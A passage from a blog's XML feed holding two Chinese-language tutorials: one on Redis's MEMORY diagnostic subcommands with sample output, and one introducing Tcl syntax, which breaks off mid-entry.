    
    
    <entry>
      <title>Redis的Memory命令讲解</title>
      <link href="/2019/01/24/memory-redis/"/>
      <url>/2019/01/24/memory-redis/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><code>Memory</code>指令是Redis4.0版本更新的特性，可用于详细的分析内存的使用情况，内存使用诊断，内存碎片回收等工作；</p><p>可以通过<code>memory help</code>指令打印出<code>memory</code>指令的信息，详细信息如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1) MEMORY &lt;subcommand&gt; arg arg ... arg. Subcommands are:</span><br><span class="line">2) DOCTOR - Return memory problems reports.</span><br><span class="line">3) MALLOC-STATS -- Return internal statistics report from the memory allocator.</span><br><span class="line">4) PURGE -- Attempt to purge dirty pages <span class="keyword">for</span> reclamation by the allocator.</span><br><span class="line">5) STATS -- Return information about the memory usage of the server.</span><br><span class="line">6) USAGE &lt;key&gt; [SAMPLES &lt;count&gt;] -- Return memory <span class="keyword">in</span> bytes used by &lt;key&gt; and its value. Nested values are sampled up to &lt;count&gt; <span class="built_in">times</span> (default: 5).</span><br></pre></td></tr></table></figure><p>具体的指令相关解释为：</p><ul><li><code>MEMORY DOCKER</code>：返回内存问题报告；</li><li><code>MEMORY MALLOC-STATS</code>：从内存分配器返回内部统计信息报告；</li><li><code>MEMORY PURGE</code>：尝试通过分配器清除脏页以进行回收；</li><li><code>MEMORY STATS</code>：返回有关服务器内存使用情况的信息；</li><li><code>MEMORY USAGE key [SAMPLES count]</code>：返回 key 使用的字节数及其值， 嵌套值最多采样 count 次（默认值：5）；</li></ul><h2 id="二、具体的指令解析"><a href="#二、具体的指令解析" class="headerlink" title="二、具体的指令解析"></a>二、具体的指令解析</h2><h3 id="2-1、MEMORY-DOCKER"><a href="#2-1、MEMORY-DOCKER" class="headerlink" title="2.1、MEMORY DOCKER"></a>2.1、MEMORY DOCKER</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memory doctor</span><br></pre></td></tr></table></figure><p>该指令主要列举条件判断，满足条件的给出检查结果和建议，主要包含以下几点，满足其中一点，就给出诊断结果和建议，检测报告会提示所有检测出的问题，检测结构主要为一下几种情况：</p><ul><li><code>无异常</code>：并没有检测出问题；</li><li><code>空实例/内存占用小</code>：示例实际分配内存小于5M，无法进一步进行检测（代码：<code>mh-&gt;total_allocated &lt; (1024*1024*5)</code>）；</li><li><code>历史内存与当前内存比例过大</code>：redis自启动以来分配的内存峰值&#x2F;当前的内存大小结果大于 1.5（代码：<code>((float)mh-&gt;peak_allocated / mh-&gt;total_allocated) &gt; 1.5</code>）；</li><li><code>内存碎片率</code>：内存碎片率大于1.4（代码：<code>mh-&gt;fragmentation &gt; 1.4</code>）；</li><li><code>一般客户端单实例内存</code>：非从库客户端的单实例内存占用大于200KB（代码：<code>mh-&gt;clients_normal / numclients &gt; (1024*200)</code>）；</li><li><code>从库客户端单实例内存</code>：在有从库的前提下，从库客户端的单实例内存占用大于10M（代码：<code>numslaves &gt; 0 &amp;&amp; mh-&gt;clients_slaves / numslaves &gt; (1024*1024*10)</code>）；</li></ul><p><strong>执行结果示例：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sam, I detected a few issues <span class="keyword">in</span> this Redis instance memory implants:</span><br><span class="line"></span><br><span class="line"> * High fragmentation: This instance has a memory fragmentation greater than 1.4 (this means that the Resident Set Size of the Redis process is much larger than the <span class="built_in">sum</span> of the logical allocations Redis performed). This problem is usually due either to a large peak memory (check <span class="keyword">if</span> there is a peak memory entry above <span class="keyword">in</span> the report) or may result from a workload that causes the allocator to fragment memory a lot. If the problem is a large peak memory, <span class="keyword">then</span> there is no issue. Otherwise, make sure you are using the Jemalloc allocator and not the default libc malloc. Note: The currently used allocator is <span class="string">&quot;jemalloc-3.2.0&quot;</span>.</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m here to keep you safe, Sam. I want to help you.</span></span><br></pre></td></tr></table></figure><h3 id="2-2、MEMORY-MALLOC-STATS"><a href="#2-2、MEMORY-MALLOC-STATS" class="headerlink" title="2.2、MEMORY MALLOC-STATS"></a>2.2、MEMORY MALLOC-STATS</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memory malloc-stats</span><br></pre></td></tr></table></figure><p>打印内存分配器状态，只在使用jemalloc时有用；</p><p><strong>执行结果示例：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">___ Begin jemalloc statistics ___</span><br><span class="line">Version: 3.2.0-0-g87499f6748ebe4817571e817e9f680ccb5bf54a9</span><br><span class="line">Assertions disabled</span><br><span class="line">Run-time option settings:</span><br><span class="line">  opt.abort: <span class="literal">false</span></span><br><span class="line">  opt.lg_chunk: 22</span><br><span class="line">  opt.dss: <span class="string">&quot;secondary&quot;</span></span><br><span class="line">  opt.narenas: 128</span><br><span class="line">  opt.lg_dirty_mult: 3</span><br><span class="line">  opt.stats_print: <span class="literal">false</span></span><br><span class="line">  opt.junk: <span class="literal">false</span></span><br><span class="line">  opt.quarantine: 0</span><br><span class="line">  opt.redzone: <span class="literal">false</span></span><br><span class="line">  opt.zero: <span class="literal">false</span></span><br><span class="line">  opt.tcache: <span class="literal">true</span></span><br><span class="line">  opt.lg_tcache_max: 15</span><br><span class="line">CPUs: 32</span><br><span class="line">Arenas: 128</span><br><span class="line">Pointer size: 8</span><br><span class="line">Quantum size: 16</span><br><span class="line">Page size: 4096</span><br><span class="line">Min active:dirty page ratio per arena: 8:1</span><br><span class="line">Maximum thread-cached size class: 32768</span><br><span class="line">Chunk size: 4194304 (2^22)</span><br><span class="line">Allocated: 5948968, active: 6402048, mapped: 20971520</span><br><span class="line">Current active ceiling: 12582912</span><br><span class="line">chunks: nchunks   highchunks    curchunks</span><br><span class="line">              5            5            5</span><br><span class="line">huge: nmalloc      ndalloc    allocated</span><br><span class="line">            0            0            0</span><br><span class="line"></span><br><span class="line">Merged arenas stats:</span><br><span class="line">assigned threads: 2</span><br><span class="line">dss allocation precedence: N/A</span><br><span class="line">dirty pages: 1563:0 active:dirty, 5 sweeps, 4 madvises, 386 purged</span><br><span class="line">            allocated      nmalloc      ndalloc    nrequests</span><br><span class="line">small:         501288        12362         1272       283989</span><br><span class="line">large:        5447680           12            4           14</span><br><span class="line">total:        5948968        12374         1276       284003</span><br><span class="line">active:       6402048</span><br><span class="line">mapped:      12582912</span><br><span class="line">bins:     bin  size regs pgs    allocated      nmalloc      ndalloc    nrequests       nfills     nflushes      newruns       reruns      curruns</span><br><span class="line">            0     8  501   1           40          109          104          100            3            6            1            0            1</span><br><span class="line">            1    16  252   1       164336        10372          101       282735          114            9           41            0           41</span><br><span class="line">            2    32  126   1        14432          604          153          751           25           10            5            7            4</span><br><span class="line">            3    48   84   1         1200           99           74          181            4            9            1            0            1</span><br><span class="line">            4    64   63   1          640           80           70           56            4            6            1            0            1</span><br><span class="line">            5    80   50   1         1760           80           58           23            5            6            1            0            1</span><br><span class="line">            6    96   84   2         8544          119           30           94            7            7            2            0            2</span><br><span class="line">            7   112   72   2          448           80           76            6            3            6            1            0            1</span><br><span class="line">            8   128   63   2          768           76           70           19            6            9            1            0            1</span><br><span class="line">[9..10]</span><br><span class="line">           11   224   72   4          448           78           76            2            3            6            3            0            1</span><br><span class="line">           12   256   63   4          768           72           69            6            4            6            4            0            1</span><br><span class="line">[13..14]</span><br><span class="line">           15   448   63   7        28224           63            0            0            1            0            1            0            1</span><br><span class="line">           16   512   63   8         1536           69           66            4            3            5            3            0            1</span><br><span class="line">           17   640   51   8            0           51           51            1            1            3            1            0            0</span><br><span class="line">           18   768   47   9          768           47           46            1            1            3            1            0            1</span><br><span class="line">           19   896   45  10        40320           45            0            0            1            0            1            0            1</span><br><span class="line">           20  1024   63  16         1024           67           66            4            3            6            2            0            1</span><br><span class="line">[21]</span><br><span class="line">           22  1536   42  16            0           47           47            2            2            5            2            0            0</span><br><span class="line">           23  1792   38  17        68096           38            0            0            1            0            1            0            1</span><br><span class="line">           24  2048   65  33        10240           69           64            2            2            4            1            0            1</span><br><span class="line">           25  2560   52  33        17920           58           51            2            2            3            1            0            1</span><br><span class="line">[26]</span><br><span class="line">           27  3584   39  35       139776           39            0            0            1            0            1            0            1</span><br><span class="line">large:   size pages      nmalloc      ndalloc    nrequests      curruns</span><br><span class="line">[1]</span><br><span class="line">         8192     2            5            3            7            2</span><br><span class="line">[1]</span><br><span class="line">        16384     4            2            0            2            2</span><br><span class="line">[3]</span><br><span class="line">        32768     8            2            0            2            2</span><br><span class="line">[292]</span><br><span class="line">      1232896   301            1            0            1            1</span><br><span class="line">[30]</span><br><span class="line">      1359872   332            1            1            1            0</span><br><span class="line">[668]</span><br><span class="line">      4100096  1001            1            0            1            1</span><br><span class="line">[17]</span><br><span class="line"></span><br><span class="line">arenas[0]:</span><br><span class="line">assigned threads: 1</span><br><span class="line">dss allocation precedence: disabled</span><br><span class="line">dirty pages: 1554:0 active:dirty, 3 sweeps, 4 madvises, 386 purged</span><br><span class="line">            allocated      nmalloc      ndalloc    nrequests</span><br><span class="line">small:         498088        12262         1272       283989</span><br><span class="line">large:        5414912           11            4           13</span><br><span class="line">total:        5913000        12273         1276       284002</span><br><span class="line">active:       6365184</span><br><span class="line">mapped:       8388608</span><br><span class="line">bins:     bin  size regs pgs    allocated      nmalloc      ndalloc    nrequests       nfills     nflushes      newruns       reruns      curruns</span><br><span class="line">            0     8  501   1           40          109          104          100            3            6            1            0            1</span><br><span class="line">            1    16  252   1       164336        10372          101       282735          114            9           41            0           41</span><br><span class="line">            2    32  126   1        11232          504          153          751           24           10            4            7            3</span><br><span class="line">            3    48   84   1         1200           99           74          181            4            9            1            0            1</span><br><span class="line">            4    64   63   1          640           80           70           56            4            6            1            0            1</span><br><span class="line">            5    80   50   1         1760           80           58           23            5            6            1            0            1</span><br><span class="line">            6    96   84   2         8544          119           30           94            7            7            2            0            2</span><br><span class="line">            7   112   72   2          448           80           76            6            3            6            1            0            1</span><br><span class="line">            8   128   63   2          768           76           70           19            6            9            1            0            1</span><br><span class="line">[9..10]</span><br><span class="line">           11   224   72   4          448           78           76            2            3            6            3            0            1</span><br><span class="line">           12   256   63   4          768           72           69            6            4            6            4            0            1</span><br><span class="line">[13..14]</span><br><span class="line">           15   448   63   7        28224           63            0            0            1            0            1            0            1</span><br><span class="line">           16   512   63   8         1536           69           66            4            3            5            3            0            1</span><br><span class="line">           17   640   51   8            0           51           51            1            1            3            1            0            0</span><br><span class="line">           18   768   47   9          768           47           46            1            1            3            1            0            1</span><br><span class="line">           19   896   45  10        40320           45            0            0            1            0            1            0            1</span><br><span class="line">           20  1024   63  16         1024           67           66            4            3            6            2            0            1</span><br><span class="line">[21]</span><br><span class="line">           22  1536   42  16            0           47           47            2            2            5            2            0            0</span><br><span class="line">           23  1792   38  17        68096           38            0            0            1            0            1            0            1</span><br><span class="line">           24  2048   65  33        10240           69           64            2            2            4            1            0            1</span><br><span class="line">           25  2560   52  33        17920           58           51            2            2            3            1            0            1</span><br><span class="line">[26]</span><br><span class="line">           27  3584   39  35       139776           39            0            0            1            0            1            0            1</span><br><span class="line">large:   size pages      nmalloc      ndalloc    nrequests      curruns</span><br><span class="line">[1]</span><br><span class="line">         8192     2            5            3            7            2</span><br><span class="line">[1]</span><br><span class="line">        16384     4            2            0            2            2</span><br><span class="line">[3]</span><br><span class="line">        32768     8            1            0            1            1</span><br><span class="line">[292]</span><br><span class="line">      1232896   301            1            0            1            1</span><br><span class="line">[30]</span><br><span class="line">      1359872   332            1            1            1            0</span><br><span class="line">[668]</span><br><span class="line">      4100096  1001            1            0            1            1</span><br><span class="line">[17]</span><br><span class="line"></span><br><span class="line">arenas[1]:</span><br><span class="line">assigned threads: 1</span><br><span class="line">dss allocation precedence: disabled</span><br><span class="line">dirty pages: 9:0 active:dirty, 2 sweeps, 0 madvises, 0 purged</span><br><span class="line">            allocated      nmalloc      ndalloc    nrequests</span><br><span class="line">small:           3200          100            0            0</span><br><span class="line">large:          32768            1            0            1</span><br><span class="line">total:          35968          101            0            1</span><br><span class="line">active:         36864</span><br><span class="line">mapped:       4194304</span><br><span class="line">bins:     bin  size regs pgs    allocated      nmalloc      ndalloc    nrequests       nfills     nflushes      newruns       reruns      curruns</span><br><span class="line">[0..1]</span><br><span class="line">            2    32  126   1         3200          100            0            0            1            0            1            0            1</span><br><span class="line">[3..27]</span><br><span class="line">large:   size pages      nmalloc      ndalloc    nrequests      curruns</span><br><span class="line">[7]</span><br><span class="line">        32768     8            1            0            1            1</span><br><span class="line">[1010]</span><br><span class="line">--- End jemalloc statistics ---</span><br></pre></td></tr></table></figure><p>执行结果说明：无，待补充</p><h3 id="2-3、MEMORY-PURGE"><a href="#2-3、MEMORY-PURGE" class="headerlink" title="2.3、MEMORY PURGE"></a>2.3、MEMORY PURGE</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memory purge</span><br></pre></td></tr></table></figure><p>该指令通过调用<code>jemalloc</code>的内部命令尽量把<code>redis</code>进程占用但未有效使用内存释放，即常说的内存碎片释放给操作系统（只适用于使用jemalloc作为allocator的实例）；</p><h3 id="2-4、MEMORY-STATS"><a href="#2-4、MEMORY-STATS" class="headerlink" title="2.4、MEMORY STATS"></a>2.4、MEMORY STATS</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memory stats</span><br></pre></td></tr></table></figure><p>在 redis 4.0 之前，只能通过<code>info memory</code>查看redis实例的内存大体使用状况，而无法了解内存的具体使用细节，比如<code>expire的消耗</code>，<code>client output buffer</code>, <code>query buffer</code>等是很难直观显示的。该指令能够展现<code>redis</code>内部内存使用细节；</p><p><strong>执行结果示例及对应参数解析：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 1) <span class="string">&quot;peak.allocated&quot;</span> <span class="comment"># redis从启动来，allocator分配的内存峰值</span></span><br><span class="line"> 2) (<span class="built_in">integer</span>) 2290242368</span><br><span class="line"> 3) <span class="string">&quot;total.allocated&quot;</span> <span class="comment"># allocator分配当前内存字节数</span></span><br><span class="line"> 4) (<span class="built_in">integer</span>) 2290241776</span><br><span class="line"> 5) <span class="string">&quot;startup.allocated&quot;</span> <span class="comment"># redis启动完成使用的内存字节数</span></span><br><span class="line"> 6) (<span class="built_in">integer</span>) 6315320</span><br><span class="line"> 7) <span class="string">&quot;clients.normal&quot;</span> <span class="comment"># 所有一般客户端消耗内存节字数,即所有flag为N的客户端内存使用</span></span><br><span class="line"> 8) (<span class="built_in">integer</span>) 150754</span><br><span class="line"> 9) <span class="string">&quot;aof.buffer&quot;</span> <span class="comment"># aof buffer使用内存字节数，一般较小，在aof rewrite时会变得较大</span></span><br><span class="line">10) (<span class="built_in">integer</span>) 0</span><br><span class="line">11) <span class="string">&quot;lua.caches&quot;</span> <span class="comment"># 所有lua脚本占用的内存节字数</span></span><br><span class="line">12) (<span class="built_in">integer</span>) 0</span><br><span class="line">13) <span class="string">&quot;db.0&quot;</span></span><br><span class="line">14) 1) <span class="string">&quot;overhead.hashtable.main&quot;</span> <span class="comment"># 对应db的所有key的hash表总的内存节字数</span></span><br><span class="line">    2) (<span class="built_in">integer</span>) 680720488</span><br><span class="line">    3) <span class="string">&quot;overhead.hashtable.expires&quot;</span> <span class="comment"># 对应db的过期key的hash表总的内存节字数</span></span><br><span class="line">    4) (<span class="built_in">integer</span>) 416</span><br><span class="line">15) <span class="string">&quot;overhead.total&quot;</span> <span class="comment"># redis总的分配的内存的字节数</span></span><br><span class="line">16) (<span class="built_in">integer</span>) 687186978</span><br><span class="line">17) <span class="string">&quot;keys.count&quot;</span> <span class="comment"># 整个实例key的个数，相同于dbsize返回值</span></span><br><span class="line">18) (<span class="built_in">integer</span>) 13662569</span><br><span class="line">19) <span class="string">&quot;keys.bytes-per-key&quot;</span> <span class="comment"># 每个key平均占用字节数；把overhead也均摊到每个key上</span></span><br><span class="line">20) (<span class="built_in">integer</span>) 167</span><br><span class="line">21) <span class="string">&quot;dataset.bytes&quot;</span> <span class="comment"># 表示redis数据集占用的内存容量，即分配的内存总量减去 overhead.total</span></span><br><span class="line">22) (<span class="built_in">integer</span>) 1603054798</span><br><span class="line">23) <span class="string">&quot;dataset.percentage&quot;</span> <span class="comment"># 表示redis数据占用内存占总内存分配的百分比</span></span><br><span class="line">24) <span class="string">&quot;70.188545227050781&quot;</span></span><br><span class="line">25) <span class="string">&quot;peak.percentage&quot;</span> <span class="comment"># 当前内存使用量在峰值时的占比</span></span><br><span class="line">26) <span class="string">&quot;99.999977111816406&quot;</span></span><br><span class="line">27) <span class="string">&quot;allocator.allocated&quot;</span> <span class="comment"># 该参数不同与 total.allocated, 它计算所有分配的内存大小（不仅仅是使用zmalloc分配的）</span></span><br><span class="line">28) (<span class="built_in">integer</span>) 2291632296</span><br><span class="line">29) <span class="string">&quot;allocator.active&quot;</span> <span class="comment"># 与常驻内存allocator.resident不同，这不包括jemalloc申请的还未使用的内存</span></span><br><span class="line">30) (<span class="built_in">integer</span>) 2293006336</span><br><span class="line">31) <span class="string">&quot;allocator.resident&quot;</span> <span class="comment"># 与RSS不同，这不包括来自共享库和其他非堆映射的RSS</span></span><br><span class="line">32) (<span class="built_in">integer</span>) 2340564992</span><br><span class="line">33) <span class="string">&quot;allocator-fragmentation.ratio&quot;</span> <span class="comment"># 等于 allocator.active / allocator.allocated</span></span><br><span class="line">34) <span class="string">&quot;1.0005995035171509&quot;</span></span><br><span class="line">35) <span class="string">&quot;allocator-fragmentation.bytes&quot;</span> <span class="comment"># 等于 allocator.active - allocator.allocated</span></span><br><span class="line">36) (<span class="built_in">integer</span>) 1374040</span><br><span class="line">37) <span class="string">&quot;allocator-rss.ratio&quot;</span> <span class="comment"># 等于 allocator.resident / allocator.active</span></span><br><span class="line">38) <span class="string">&quot;1.0207407474517822&quot;</span></span><br><span class="line">39) <span class="string">&quot;allocator-rss.bytes&quot;</span> <span class="comment"># 等于 allocator.resident - allocator.active</span></span><br><span class="line">40) (<span class="built_in">integer</span>) 47558656</span><br><span class="line">41) <span class="string">&quot;rss-overhead.ratio&quot;</span> <span class="comment"># 等于 RSS / allocator.resident</span></span><br><span class="line">42) <span class="string">&quot;0.99930697679519653&quot;</span></span><br><span class="line">43) <span class="string">&quot;rss-overhead.bytes&quot;</span> <span class="comment"># 等于 RSS - allocator.resident</span></span><br><span class="line">44) (<span class="built_in">integer</span>) -1622016</span><br><span class="line">45) <span class="string">&quot;fragmentation&quot;</span> <span class="comment"># 等于 RSS / total.allocated</span></span><br><span class="line">46) <span class="string">&quot;1.0212923288345337&quot;</span></span><br><span class="line">47) <span class="string">&quot;fragmentation.bytes&quot;</span> <span class="comment"># 等于 RSS - total.allocated</span></span><br><span class="line">48) (<span class="built_in">integer</span>) 48763208</span><br></pre></td></tr></table></figure><h3 id="2-5、MEMORY-USAGE-key-SAMPLES-count"><a href="#2-5、MEMORY-USAGE-key-SAMPLES-count" class="headerlink" title="2.5、MEMORY USAGE key [SAMPLES count]"></a>2.5、MEMORY USAGE key [SAMPLES count]</h3><p><strong>使用方式</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对全部key</span></span><br><span class="line">memory usage k1</span><br><span class="line"><span class="comment"># 针对编码使用 REDIS_ENCODING_HT 和 REDIS_ENCODING_SKIPLIST 的另一种方式</span></span><br><span class="line"><span class="comment"># 采样10个元素近似估算整个value的实际内存占用</span></span><br><span class="line">memory usage tk samples 10</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其他特点：</strong></p><ul><li>只计算value对应的内存估计值，key不存在返回nil；</li><li>如果key存在过期，不包含Key Expire的内存占用；</li><li>对于编码类型为<code>REDIS_ENCODING_HT</code>和<code>REDIS_ENCODING_SKIPLIST</code>，usage子命令采用类似<code>LRU SAMPLES</code>的抽样方式，默认抽样5个元素求平均 X 元数个数 得出实际内存占用，计算结果是近似值，当面可以指定抽样的SAMPLES个数；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Redis </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCL语言入门</title>
      <link href="/2019/01/13/tcl-first/"/>
      <url>/2019/01/13/tcl-first/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>Tcl是一种很通用的脚本语言，它几乎在所有的平台上都可以释运行，一条TCL的命令串包含若干条命令，命令使用换行符或分号来隔开；而每一条命令包含若干个域(field)，域使用空白（空格或TAB）来隔开——第一个域是命令的名字，其它的域是该命令的参数。</p><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><h3 id="2-1、注释"><a href="#2-1、注释" class="headerlink" title="2.1、注释"></a>2.1、注释</h3><p>注释在调试的过程中轻常碰到。TCL语言的注释符号是 <code>#</code> ，加在每一行的最前面。</p><h3 id="2-2、脚本、命令、单词"><a href="#2-2、脚本、命令、单词" class="headerlink" title="2.2、脚本、命令、单词"></a>2.2、脚本、命令、单词</h3><p>一个TCL <code>脚本</code> 可以包含一个或多个 <code>命令</code> 。 <code>命令</code> 之间必须用换行符或分号隔开，推荐使用换行符分开。下面就是一个合法的TCL <code>脚本</code> ，它由两个赋值 <code>命令</code> 组成；</p><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> a <span class="number">1</span></span><br><span class="line"><span class="keyword">set</span> b <span class="number">2</span></span><br></pre></td></tr></table></figure><p>TCL的每一个 <code>命令</code> 包含一个或几个 <code>单词</code>，第一个单词代表命令名，另外的单词则是这个命令的参数，单词之间必须用 <code>空格</code> 或 <code>TAB键</code> 隔开。上面代码中的 <code>set</code> ， <code>a</code> ， <code>1</code> 分别是三个单词。</p><p>TCL解释器对一个 <code>命令</code> 的求值过程分为两部分：分析和执行；</p><ul><li>在分析阶段，TCL 解释器运用规则把 <code>命令</code> 分成一个个独立的单词，同时进行必要的 <code>置换(substitution)</code> ； </li><li>在执行阶段，TCL 解释器会把第一个单词当作 <code>命令名</code> ，并查看这个命令是否有定义，如果有定义就激活这个命令对应的 C&#x2F;C++ 过程，并把所有的单词作为参数传递给该命令过程，让命令过程进行处理；</li></ul><h3 id="2-3、置换-substitution"><a href="#2-3、置换-substitution" class="headerlink" title="2.3、置换(substitution)"></a>2.3、置换(substitution)</h3><p>TCL解释器在分析命令时，把所有的命令参数都当作字符串看待，例如：</p><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; <span class="keyword">set</span> x <span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">OpenSees &gt; <span class="keyword">set</span> y x+<span class="number">1</span></span><br><span class="line">x+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>上例的第二个命令中，<code>x </code>被看作字符串 <code>x+1</code> 的一部分，此时y的值为 <code>x+1</code> 如果我们想使用x的值<code>10</code> ，就必须告诉<code>TCL</code>解释器：我们在这里期望的是变量x的值，而非字符<code>x</code>。怎么告诉<code>TCL</code>解释器呢，这就要用到TCL语言中提供的 <code>置换</code> 功能。<code>TCL</code>提供三种形式的置换： <code>变量置换</code> 、 <code>命令置换</code> 和 <code>反斜杠置换</code> ；</p><ul><li>**<code>变量置换</code>**：在变量符号之前用 <code>$</code> 符号标记。这会导致变量的值插入一个单词中；</li></ul><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; <span class="keyword">set</span> y <span class="variable">$x</span>+<span class="number">1</span></span><br><span class="line"><span class="number">10</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里x的值已经被替换成 <code>10</code> ，但是没有执行我们想要的 <code>x+1</code> 计算。这时就要用到命令置换。</p><ul><li>**<code>命令置换</code>**：由 <code>[]</code> 括起来的TCL命令及其参数，命令置换会导致某一个命令的所有或部分单词被另一个命令的结果所代替，当使用 <code>expr</code> 作为<code>TCL</code>命令的时候，支持如下常用运算，例如：<ul><li><code>+</code> 、 <code>-</code> 、 <code>*</code> 、 <code>/</code> ：加减乘除；</li><li><code>&gt;</code> 、 <code>&lt;</code> 、 <code>&lt;=</code> 、 <code>&gt;=</code> 、 <code>==</code> 、 <code>!=</code> ：布尔运算</li><li><code>abs()</code> 、 <code>sin()</code> 、 <code>pow()</code> 、 <code>exp()</code>：常用数学函数</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; set y [expr $x+1]</span><br><span class="line">11</span><br></pre></td></tr></table></figure><ul><li>**<code>反斜杠置换</code>**：TCL语言中的反斜杠置换类似于C语言中反斜杠的用法，主要用于在单词符号中插入诸如换行符、空格、[]、$等被TCL解释器当作特殊符号对待的字符。例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; set msg multiple\ space</span><br><span class="line">multiple space</span><br></pre></td></tr></table></figure><p>如果没有 <code>\</code> 的话，TCL会报错，因为解释器会把这里最后两个单词之间的空格认为是分隔符，于是发现set命令有多于两个参数，从而报错。加入了 <code>\</code> 后，空格不被当作分隔符，<code>multiple space</code> 被认为是一个 <code>单词</code>。</p><p>TCL支持以下反斜杠置换：</p><table><thead><tr><th align="center">Backslash Sequence</th><th align="center">Replaced By</th></tr></thead><tbody><tr><td align="center">\a</td><td align="center">Audible alert (0x7) 响铃</td></tr><tr><td align="center">\b</td><td align="center">Backspace (0x8)  退格</td></tr><tr><td align="center">\f</td><td align="center">Form feed (0xc) 换页</td></tr><tr><td align="center">\n 或 \newline</td><td align="center">Newline (0xa) 新行</td></tr><tr><td align="center">\r</td><td align="center">Carriage return (0xd) 回车</td></tr><tr><td align="center">\t</td><td align="center">Tab (0x9) 水平制表</td></tr><tr><td align="center">\v</td><td align="center">Vertical tab (0xb) 垂直制表</td></tr><tr><td align="center">\ddd</td><td align="center">Octal value given by ddd 八进制值</td></tr><tr><td align="center">\xhh</td><td align="center">Hex value given by hh 十六进制值</td></tr><tr><td align="center">\ newline space</td><td align="center">A single space character. 空格</td></tr></tbody></table><h3 id="2-4、双引号和花括号"><a href="#2-4、双引号和花括号" class="headerlink" title="2.4、双引号和花括号"></a>2.4、双引号和花括号</h3><p>除了使用反斜杠外，TCL提供另外两种方法来使得解释器把分隔符和置换符等特殊字符当作普通字符，而不作特殊处理，这就要使用双引号和花括号({})。</p><p>TCL解释器对双引号中的各种分隔符将不作处理，但是对换行符 及＄和[]两种置换符会照常处理。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; set  x  100</span><br><span class="line">100</span><br><span class="line">OpenSees &gt; set  y  &quot;$x   ddd&quot;</span><br><span class="line">100   ddd</span><br></pre></td></tr></table></figure><p>而在花括号中，所有特殊字符都将成为普通字符，失去其特殊意义，TCL解释器不会对其作特殊处理。</p><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; <span class="keyword">set</span>  y &#123;/n<span class="variable">$x</span>   [<span class="keyword">expr</span> <span class="number">10</span>+<span class="number">100</span>]&#125;</span><br><span class="line">/n<span class="variable">$x</span>   [<span class="keyword">expr</span> <span class="number">10</span>+<span class="number">100</span>]</span><br></pre></td></tr></table></figure><h3 id="2-5、变量"><a href="#2-5、变量" class="headerlink" title="2.5、变量"></a>2.5、变量</h3><p>TCL的变量有两种，分别是简单变量和数组。</p><ul><li><strong>简单变量</strong>：一个TCL的简单变量包含两个部分：名字和值。名字和值都可以是任意字符串。变量推荐使用字母，数字与下划线的组合来命名。 TCL解释器在分析一个变量置换时，只把从＄符号往后直到第一个不是字母、数字或下划线的字符之间的单词符号作为要被置换的变量的名字。例如:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; set mat_tag 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>TCL中的set命令能生成一个变量、也能读取或改变一个变量的值。如果变量 <code>mat_tag</code> 还没有定义，这个命令将生成该变量，并将其值置为 <code>2</code> ，若 <code>mat_tag</code> 已定义，就简单的把 <code>mat_tag</code> 的值置为 <code>2</code> 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; set mat_tag</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>这个只有一个参数的set命令读取 <code>mat_tag</code> 的当前值 <code>2</code> 。</p><ul><li><strong>数组</strong>：在TCL中，数组是带有字符串值索引的变量，请注意，是字符串索引，而不是数字索引。由于TCL语言的这个特性，导致其数组的声明和引用都不是很方便。在OpenSees编程时，建议使用 <code>列表(List)</code> 。</li></ul><h3 id="2-6、列表"><a href="#2-6、列表" class="headerlink" title="2.6、列表"></a>2.6、列表</h3><p>TCL中列表(list)是由一堆元素组成的 <strong>有序</strong> 集合，list可以嵌套定义，list每个元素可以是任意字符串，也可以是list。下面都是TCL中的合法的list：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#125;    //空list</span><br><span class="line">&#123;a b c d&#125;</span><br><span class="line">&#123;a &#123;b c&#125; d&#125; //list可以嵌套</span><br></pre></td></tr></table></figure><p>list是TCL中比较重要的一种数据结构，对于编写复杂的脚本有很大的帮助，TCL提供了很多基本命令对list进行操作，下面一一介绍：</p><h4 id="2-6-1、list命令"><a href="#2-6-1、list命令" class="headerlink" title="2.6.1、list命令"></a>2.6.1、list命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list ? value value...?</span><br></pre></td></tr></table></figure><p>这个命令生成一个list，list的元素就是所有的value。例：</p><figure class="highlight 